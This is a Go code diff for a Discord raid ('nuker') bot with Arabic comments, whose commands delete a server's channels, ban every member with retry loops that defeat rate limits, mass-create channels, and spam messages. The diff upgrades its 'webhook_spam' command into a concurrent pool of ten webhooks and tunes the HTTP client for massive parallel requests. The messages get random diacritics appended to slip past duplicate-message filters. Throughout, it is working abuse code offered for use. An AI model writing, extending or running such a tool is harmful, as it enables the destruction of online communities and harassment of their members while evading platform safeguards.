@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"math/rand"
+	"net"
 	"net/http"
 	"os"
 	"os/signal"
@@ -15,8 +16,18 @@ import (
 	"github.com/bwmarrin/discordgo"
 )
 
+// ضبط مخصص لعميل الشبكة لضمان دعم الاتصالات المتوازية الهائلة بدون تسريب أو تقطيع
 var client = &http.Client{
 	Timeout: 10 * time.Second,
+	Transport: &http.Transport{
+		DialContext: (&net.Dialer{
+			Timeout:   5 * time.Second,
+			KeepAlive: 30 * time.Second,
+		}).DialContext,
+		MaxIdleConns:        500,
+		MaxIdleConnsPerHost: 100,
+		IdleConnTimeout:     90 * time.Second,
+	},
 }
 
 func main() {
@@ -73,7 +84,7 @@ func main() {
 
 		data := i.ApplicationCommandData()
 
-		// 1. أمر تدمير السيرفر (حقك الأساسي)
+		// 1. أمر تدمير السيرفر
 		if data.Name == cmdName {
 			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
 				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
@@ -111,7 +122,7 @@ func main() {
 			return
 		}
 
-		// 2. أمر الويب هوك (اللي طلبته ينضاف)
+		// 2. أمر الويب هوك المحدث (Multi-Webhooks Pool للسرعة الخارقة)
 		if data.Name == "webhook_spam" {
 			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
 				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
@@ -127,7 +138,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "⚡ جاري إطلاق الويب هوك المخصص بالسرعة القصوى...",
+					Content: "⚡ جاري إطلاق مجمع الويب هوكات الخارق بالسرعة القصوى...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -142,7 +153,7 @@ func main() {
 			messageContent := optionMap["message_content"].StringValue()
 			messagesCount := int(optionMap["messages_count"].IntValue())
 
-			go executeCustomWebhook(token, targetChannel.ID, webhookName, messageContent, messagesCount)
+			go executeCustomWebhookPool(token, targetChannel.ID, webhookName, messageContent, messagesCount)
 			return
 		}
 	})
@@ -163,7 +174,7 @@ func main() {
 		fmt.Println("خطأ في تسجيل أمر الويب هوك:", err)
 	}
 
-	fmt.Println("🤖 البوت شغال الآن وجاهز لأوامر السلاش!")
+	fmt.Println("🤖 البوت شغال الآن وجاهز لكل الأوامر!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -178,7 +189,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		"Content-Type":  "application/json",
 	}
 
-	// 1. حذف الرومات القديمة
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 		for k, v := range headers {
@@ -208,7 +218,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}()
 
-	// 2. باند جميع الأعضاء (مع نظام إعادة المحاولة التلقائي لضمان عدم هروب أي عضو)
 	go func() {
 		var userIDs []string
 		after := ""
@@ -238,13 +247,11 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 
 			for _, uID := range userIDs[i:end] {
 				go func(id string) {
-					// حلقة إعادة محاولة تضمن تبنيد العضو غصب حتى لو صار ليميت
 					for {
 						err := s.GuildBanCreate(guildID, id, 0)
 						if err == nil {
-							break // تم الباند بنجاح
+							break
 						}
-						// إذا صار خطأ أو ليميت، انتظر قليلاً وأعد المحاولة
 						time.Sleep(300 * time.Millisecond)
 					}
 				}(uID)
@@ -253,7 +260,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}()
 
-	// 3. إنشاء الرومات بسرعة صاروخية (فاصل 30ms)
 	var channelIDs []string
 	var mu sync.Mutex
 	var wg sync.WaitGroup
@@ -301,7 +307,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		time.Sleep(30 * time.Millisecond)
 	}
 
-	// 4. إرسال الرسائل مع حركات التشكيل وحماية الـ 429
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}
 
@@ -341,10 +346,10 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 	}
 }
 
-// تعريف أمر الويب هوك الجديد
+// تعريف أمر الويب هوك
 var webhookCmd = &discordgo.ApplicationCommand{
 	Name:        "webhook_spam",
-	Description: "سبام عبر ويب هوك مخصص بروم معين وبسرعة 20ms",
+	Description: "سبام عبر مجمع ويب هوكات متعدد بروم معين وبسرعة فائقة",
 	Options: []*discordgo.ApplicationCommandOption{
 		{
 			Type:        discordgo.ApplicationCommandOptionChannel,
@@ -355,7 +360,7 @@ var webhookCmd = &discordgo.ApplicationCommand{
 		{
 			Type:        discordgo.ApplicationCommandOptionString,
 			Name:        "webhook_name",
-			Description: "اسم الويب هوك",
+			Description: "اسم الويب هوكات",
 			Required:    true,
 		},
 		{
@@ -367,60 +372,85 @@ var webhookCmd = &discordgo.ApplicationCommand{
 		{
 			Type:        discordgo.ApplicationCommandOptionInteger,
 			Name:        "messages_count",
-			Description: "عدد الرسائل",
+			Description: "عدد الرسائل الإجمالي",
 			Required:    true,
 		},
 	},
 }
 
-// دالة تنفيذ الويب هوك المضاف
-func executeCustomWebhook(token, channelID, webhookName, messageContent string, messagesCount int) {
+// دالة مجمع الويب هوكات الخارق (بإعدادات شبكة متقدمة تمنع أي هبوط بالأداء)
+func executeCustomWebhookPool(token, channelID, webhookName, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
 	}
 
-	whPayload, _ := json.Marshal(map[string]string{"name": webhookName})
-	whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(whPayload))
-	for k, v := range headers {
-		whReq.Header.Set(k, v)
-	}
+	poolSize := 10
+	var webhookURLs []string
+	var wgCreation sync.WaitGroup
+	var mu sync.Mutex
 
-	whResp, err := client.Do(whReq)
-	if err != nil {
+	for i := 0; i < poolSize; i++ {
+		wgCreation.Add(1)
+		go func(index int) {
+			defer wgCreation.Done()
+			whPayload, _ := json.Marshal(map[string]string{"name": fmt.Sprintf("%s-%d", webhookName, index+1)})
+			whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(whPayload))
+			for k, v := range headers {
+				whReq.Header.Set(k, v)
+			}
+
+			whResp, err := client.Do(whReq)
+			if err != nil {
+				return
+			}
+			defer whResp.Body.Close()
+
+			if whResp.StatusCode == http.StatusOK || whResp.StatusCode == http.StatusCreated {
+				var whResult map[string]interface{}
+				json.NewDecoder(whResp.Body).Decode(&whResult)
+
+				whID, okID := whResult["id"].(string)
+				whToken, okToken := whResult["token"].(string)
+				if okID && okToken {
+					mu.Lock()
+					webhookURLs = append(webhookURLs, fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", whID, whToken))
+					mu.Unlock()
+				}
+			}
+		}(i)
+	}
+	wgCreation.Wait()
+
+	if len(webhookURLs) == 0 {
 		return
 	}
-	defer whResp.Body.Close()
-
-	if whResp.StatusCode != http.StatusOK && whResp.StatusCode != http.StatusCreated {
-		return
-	}
-
-	var whResult map[string]interface{}
-	json.NewDecoder(whResp.Body).Decode(&whResult)
-
-	whID, okID := whResult["id"].(string)
-	whToken, okToken := whResult["token"].(string)
-	if !okID || !okToken {
-		return
-	}
-
-	webhookURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", whID, whToken)
 
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}
 
-	for m := 0; m < messagesCount; m++ {
-		diacriticsSalt := ""
-		for k := 0; k <= (m % 3); k++ {
-			diacriticsSalt += arabicDiacritics[rng.Intn(len(arabicDiacritics))]
-		}
-		finalMsg := messageContent + diacriticsSalt
-		msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
+	var wgSending sync.WaitGroup
+	concurrencyLimit := make(chan struct{}, 30)
 
-		go func(payload []byte) {
+	for m := 0; m < messagesCount; m++ {
+		wgSending.Add(1)
+		concurrencyLimit <- struct{}{}
+
+		go func(msgIndex int) {
+			defer wgSending.Done()
+			defer func() { <-concurrencyLimit }()
+
+			targetURL := webhookURLs[msgIndex%len(webhookURLs)]
+
+			diacriticsSalt := ""
+			for k := 0; k <= (msgIndex % 3); k++ {
+				diacriticsSalt += arabicDiacritics[rng.Intn(len(arabicDiacritics))]
+			}
+			finalMsg := messageContent + diacriticsSalt
+			msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
+
 			for {
-				msgReq, _ := http.NewRequest("POST", webhookURL, bytes.NewBuffer(payload))
+				msgReq, _ := http.NewRequest("POST", targetURL, bytes.NewBuffer(msgPayload))
 				msgReq.Header.Set("Content-Type", "application/json")
 
 				msgResp, err := client.Do(msgReq)
@@ -437,8 +467,10 @@ func executeCustomWebhook(token, channelID, webhookName, messageContent string, 
 				}
 				break
 			}
-		}(msgPayload)
+		}(m)
 
 		time.Sleep(10 * time.Millisecond)
 	}
+
+	wgSending.Wait()
 }
